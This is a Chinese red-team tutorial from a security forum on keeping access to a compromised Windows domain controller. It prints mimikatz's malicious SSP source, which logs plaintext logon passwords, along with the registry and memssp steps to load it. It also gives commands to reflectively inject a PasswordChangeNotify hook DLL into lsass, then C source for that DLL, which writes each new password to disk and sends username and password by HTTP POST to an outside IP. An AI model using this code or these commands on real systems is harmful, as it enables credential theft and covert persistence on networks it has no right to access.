<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10167)

> 先知社区，先知安全技术社区

前言
--

拿下域控, 渗透就结束了吗? 实际上, 往往刚刚开始。  
本文就域控权限维持的两种方法展开研究:`SSP`和`PasswordChangeNotify`。牢牢抓住这条鱼。

SSP
---

### 何为 SSP

SPP 全称为`Security Support Provider`, 安全支持提供者。  
SPP 是一个 dll, 用于身份的验证。  
windows 下的 SSP 包含有:

*   NTLMSSP (msv1_0.dll)
*   Kerberos (kerberos.dll)
*   NegotiateSSP (secur32.dll)
*   Secure Channel (schannel.dll)
*   TLS/SSL
*   Digest SSP (wdigest.dll)
*   CredSSP (credssp.dll)
*   DPA(Distributed Password Authentication) (msapsspc.dll)
*   Public Key Cryptography User-to-User (PKU2U, pku2u.dll)

### SSPI

SSPI 全称为`Security Support Provider Interface`, 为 SSP 接口, 实际上就是 SSP 的 API。

### LSA

LSA 全称`Local Security Authority`, 是微软窗口操作系统的一个内部程序，负责运行 Windows 系统安全政策。它在用户登录时电脑单机或服务器时，验证用户身份，管理用户密码变更，并产生访问字符。它也会在窗口安全记录档中留下应有的记录。用于身份的验证。其中就包含有`lsass.exe`进程。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830175807-c6a0e48a-0978-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830175807-c6a0e48a-0978-1.png)

操作 lsass 进程需要至少 system 权限。

### 利用 SSP 进行权限维持

如果获得目标系统 system 权限，可以使用该方法进行持久化操作。其主要原理是：LSA（Local Security Authority）用于身份验证；lsass.exe 作为 windows 的系统进程，用于本地安全和登录策略；在系统启动时，SSP 将被加载到 lsass.exe 进程中。但是，假如攻击者对 LSA 进行了扩展，自定义了恶意的 DLL 文件，在系统启动时将其加载到 lsass.exe 进程中，就能够获取 lsass.exe 进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。

`mimikatz`早以支持这个功能, 该文件为为`mimilib.dll`。mimikatz poc 为:

```
#include "kssp.h"

static SECPKG_FUNCTION_TABLE kiwissp_SecPkgFunctionTable = {
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    kssp_SpInitialize, kssp_SpShutDown, kssp_SpGetInfo, kssp_SpAcceptCredentials,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
};

NTSTATUS NTAPI kssp_SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpShutDown(void)
{
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion   = 1;
    PackageInfo->wRPCID     = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->Name       = L"KiwiSSP";
    PackageInfo->Comment    = L"Kiwi Security Support Provider";
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    FILE * kssp_logfile;;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kssp_logfile = _wfopen(L"kiwissp.log", L"a"))
#pragma warning(pop)
    {   
        klog(kssp_logfile, L"[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t", PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, LogonType, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, AccountName);
        klog_password(kssp_logfile, &PrimaryCredentials->Password);
        klog(kssp_logfile, L"\n");
        fclose(kssp_logfile);
    }
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
    *PackageVersion = 0x00000042;
    *ppTables = &kiwissp_SecPkgFunctionTable;
    *pcTables = 1;
    return STATUS_SUCCESS;
}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830175952-051873fe-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830175952-051873fe-0979-1.png)

64 位和 32 位的都有, 和目标系统位数要一致。  
将该 dll 拷贝到域控`c:\windows\system32`下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830175958-08c3a2d0-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830175958-08c3a2d0-0979-1.png)

打开注册表, 修改域控位置`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180003-0bf437f8-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180003-0bf437f8-0979-1.png)

在`Security Packages`下添加`mimilib.dll`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180007-0e526286-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180007-0e526286-0979-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180012-10dc31ee-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180012-10dc31ee-0979-1.png)

将域控重启系统。打开新生成文件`c:\windows\system32\kiwissp.log`。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180018-14c62616-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180018-14c62616-0979-1.png)

kiwissp.log 记录着登录的账户和明文密码

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180022-174bec86-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180022-174bec86-0979-1.png)

但该方式弊端非常明显: 重启的动作太大。  
mimikatz 同样支持了以内存更新的方式更新 ssp, 无需重启就能获取到登录用户的账号信息和密码。

进入与目标系统位数相同的 mimikatz 后, 输入命令

*   privilege::debug
*   misc::memssp

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180026-19675636-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180026-19675636-0979-1.png)

当目标用户注销后再登录, 账户和明文密码会储存到`C:\Windows\system32\mimilsa.log`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180030-1ba0bda2-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180030-1ba0bda2-0979-1.png)

```
type C:\Windows\system32\mimilsa.log

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180035-1e9b7204-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180035-1e9b7204-0979-1.png)

实际上就是将该 dll 注入到 lsass 进程中。该方式重启后无效, 需要重新注入。  
但依靠 mimikatz 这两种方式有一定局限性。下面介绍通过`Hook PasswordChangeNotify`拦截修改的帐户密码的方法。

PasswordChangeNotify
--------------------

### 何为 PasswordChangeNotify

`PasswordChangeNotify`是 windows 提供的一个 API。  
具体参数返回值参照官方文档:[https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nc-ntsecapi-psam_password_notification_routine](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nc-ntsecapi-psam_password_notification_routine)  
当域控密码被修改时, LSA 首先调用`PasswordFileter`函数, 该函数作用为检测新密码是否满足复杂度。如果符合则调用`PasswordChangeNotify`在系统上同步更新密码。

### HOOK PasswordChangeNotify

具体实现思路如下:

1.  为 PasswordChangeNotify 创建一个钩子, 将函数执行流重定向到我们自己的 PasswordChangeNotifyHook 函数中。
2.  在 PasswordChangeNotifyHook 函数中写入获取密码的代码, 然后再取消钩子, 重新将执行流还给 PasswordChangeNotify。
3.  将生成的 dll 注入到 lssas 进程中。  
    使用 HOOK PasswordChangeNotify 无需重启域控系统或修改注册表, 更加隐蔽且贴合实际。

### 技术复现

前人栽树, 后人乘凉。  
项目地址:[https://github.com/clymb3r/Misc-Windows-Hacking](https://github.com/clymb3r/Misc-Windows-Hacking)

下载后将 sln 文件打开, 右键解决方案, 将 MFC 的使用设置为在静态库中使用 MFC 编译工程, 然后 F7 编译。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180041-2244c22a-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180041-2244c22a-0979-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180044-247d3252-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180044-247d3252-0979-1.png)

dll 生成成功之后就需要将 dll 注入, 这里估摸着自己写一个远线程注入也可以, 同样可以使用 powershell 脚本进行注入。

> [https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1)

使用该将 HookPasswordChange.dll 注入内存

> Set-ExecutionPolicy bypass  
> Import-Module .\Invoke-ReflectivePEInjection.ps1  
> Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass

执行后若无报错信息则说明注入成功。注意 dll 位数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180104-2fddc44a-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180104-2fddc44a-0979-1.png)

当更改密码后, 能够抓取到更改后的密码, 账户和明文密码储存在`C:\Windows\Temp\passwords.txt`。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180111-34966a8c-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180111-34966a8c-0979-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180117-37b251d6-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180117-37b251d6-0979-1.png)

当然存储文件位置和类型可以自定义, 只需更改 HookPasswordChange.cpp 文件。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210830180121-3a09b6d6-0979-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210830180121-3a09b6d6-0979-1.png)

如果觉得仍然不方便, 希望直接将密码上传到服务器, 可以使用 http 协议发送。

```
#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <ntsecapi.h>

void writeToLog(const char* szString)
{
    FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, "%s\r\n", szString);
    fclose(pFile);
    return;
}



// Default DllMain implementation
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     )
{
    OutputDebugString(L"DllMain");
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void)
{
    OutputDebugString(L"InitializeChangeNotify");
    writeToLog("InitializeChangeNotify()");
    return TRUE;
}

BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation )
{
    OutputDebugString(L"PasswordFilter");
    return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword )
{
  FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");
  //HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    HINTERNET hSession = InternetConnect(hInternet,L"192.168.1.1",80,NULL,NULL,INTERNET_SERVICE_HTTP ,0,0);
    HINTERNET hReq = HttpOpenRequest(hSession,L"POST",L"/",NULL,NULL,NULL,0,0);
    char* pBuf="SomeData";



    OutputDebugString(L"PasswordChangeNotify");
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer,NewPassword->Buffer);
  fclose(pFile);
    InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName->Buffer,UserName->Length/2);
    InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword->Buffer,NewPassword->Length/2);
    HttpSendRequest(hReq,NULL,0,pBuf,strlen(pBuf));

    return 0;
}


```

参考
--

[https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html](https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html)  
[https://github.com/gentilkiwi/mimikatz/blob/bb371c2acba397b4006a6cddc0f9ce2b5958017b/mimilib/kssp.c#L21](https://github.com/gentilkiwi/mimikatz/blob/bb371c2acba397b4006a6cddc0f9ce2b5958017b/mimilib/kssp.c#L21)  
[https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html)  
[https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Hook%20PasswordChangeNotify.html](https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Hook%20PasswordChangeNotify.html)

最后欢迎关注团队公众号：红队蓝军

[![](https://xzfile.aliyuncs.com/media/upload/picture/20220307150555-0812c072-9de5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220307150555-0812c072-9de5-1.png)